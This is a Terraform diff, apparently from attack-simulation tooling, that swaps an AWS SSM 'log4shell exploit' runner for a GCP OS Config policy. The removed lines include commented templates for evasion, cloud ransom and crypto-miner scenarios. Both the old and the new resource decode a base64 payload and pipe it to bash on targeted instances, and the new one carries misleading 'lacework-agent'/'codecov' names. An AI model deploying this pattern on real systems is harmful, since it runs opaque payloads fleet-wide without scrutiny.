@@ -130,139 +130,59 @@ locals {
                             )
 }
 
-# data "template_file" "protonvpn" {
-#     template = file("${path.module}/resources/protonvpn.env.tpl")
+resource "google_os_config_os_policy_assignment" "install-lacework-agent" {
 
-#     vars = {
-#         protonvpn_user = var.protonvpn_user
-#         protonvpn_password = var.protonvpn_password
-#         protonvpn_server = var.protonvpn_server
-#         protonvpn_tier = tostring(var.protonvpn_tier)
-#         protonvpn_protocol = var.protonvpn_protocol
-#     }
-# }
+  project     = var.gcp_project_id
+  location    = data.google_compute_zones.available.names[0]
+  
+  name        = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
+  description = "Connect codecov"
+  skip_await_rollout = true
+  
+  instance_filter {
+    all = false
 
-# data "template_file" "protonvpn-baseline" {
-#     template = file("${path.module}/resources/protonvpn.env.tpl")
-
-#     vars = {
-#         protonvpn_user = var.protonvpn_user
-#         protonvpn_password = var.protonvpn_password
-#         protonvpn_server = "US"
-#         protonvpn_tier = tostring(var.protonvpn_tier)
-#         protonvpn_protocol = var.protonvpn_protocol
-#     }
-# }
-
-# data "template_file" "auto-free" {
-#     template = file("${path.module}/resources/auto-free.sh.tpl")
-# }
-
-# data "template_file" "auto-paid" {
-#     template = file("${path.module}/resources/auto-paid.sh.tpl")
-# }
-
-# data "template_file" "baseline" {
-#     template = file("${path.module}/resources/baseline.sh.tpl")
-# }
-
-# data "template_file" "discovery" {
-#     template = file("${path.module}/resources/discovery.sh.tpl")
-# }
-
-# data "template_file" "evasion" {
-#     template = file("${path.module}/resources/evasion.sh.tpl")
-# }
-
-# data "template_file" "cloudransom" {
-#     template = file("${path.module}/resources/cloudransom.sh.tpl")
-# }
-
-# data "template_file" "cloudcrypto" {
-#     template = file("${path.module}/resources/cloudcrypto.tf.tpl")
-
-#     vars = {
-#         name = "crypto-gpu-miner-${var.environment}-${var.deployment}"
-#         instances = 12
-#         wallet = var.ethermine_wallet
-#         region = var.region
-#     }
-# }
-
-# data "template_file" "hostcrypto" {
-#     template = file("${path.module}/resources/hostcrypto.tf.tpl")
-
-#     vars = {
-#         name = "crypto-cpu-miner-${var.environment}-${var.deployment}"
-#         region = var.region
-#         instances = 1
-#         minergate_user = var.minergate_user
-#     }
-# }
-
-# data "template_file" "start" {
-#     template = file("${path.module}/resources/start.sh.tpl")
-# }
-
-resource "aws_ssm_document" "exec_docker_compromised_keys_attacker" {
-  name          = "exec_docker_compromised_keys_${var.environment}_${var.deployment}"
-  document_type = "Command"
-
-  content = jsonencode(
-    {
-        "schemaVersion": "2.2",
-        "description": "start docker based log4shell exploit",
-        "mainSteps": [
-            {
-                "action": "aws:runShellScript",
-                "name": "exec_docker_compromised_keys_attacker_${var.environment}_${var.deployment}",
-                "precondition": {
-                    "StringEquals": [
-                        "platformType",
-                        "Linux"
-                    ]
-                },
-                "inputs": {
-                    "timeoutSeconds": "5400",
-                    "runCommand": [
-                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
-                    ]
-                }
-            }
-        ]
-    })
-}
-
-resource "aws_resourcegroups_group" "exec_docker_compromised_keys_attacker" {
-    name = "exec_docker_compromised_keys_${var.environment}_${var.deployment}"
-
-    resource_query {
-        query = jsonencode(var.resource_query_exec_docker_compromised_keys_attacker)
+    inclusion_labels {
+      labels = var.label
     }
 
-    tags = {
-        billing = var.environment
-        owner   = "lacework"
-    }
-}
-
-resource "aws_ssm_association" "exec_docker_compromised_keys_attacker" {
-    association_name = "exec_docker_compromised_keys_${var.environment}_${var.deployment}"
-
-    name = aws_ssm_document.exec_docker_compromised_keys_attacker.name
-
-    targets {
-        key = "resource-groups:Name"
-        values = [
-            aws_resourcegroups_group.exec_docker_compromised_keys_attacker.name,
-        ]
+    inventories {
+      os_short_name = "ubuntu"
     }
 
-    compliance_severity = "HIGH"
+    inventories {
+      os_short_name = "debian"
+    }
 
-    # every 2 hours
-    schedule_expression = "cron(0 */2 * * ? *)"
-    
-    # will apply when updated and interval when false
-    apply_only_at_cron_interval = false
+  }
+
+  os_policies {
+    id   = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
+    mode = "ENFORCEMENT"
+
+    resource_groups {
+      resources {
+        id = "run"
+        exec {
+          validate {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "if false; then exit 100; else exit 101; fi"
+          }
+          enforce {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
+          }
+        }
+      }
+    }
+  }
+
+  rollout {
+    disruption_budget {
+      percent = 100
+    }
+    min_wait_duration = "600s"
+  }
 }
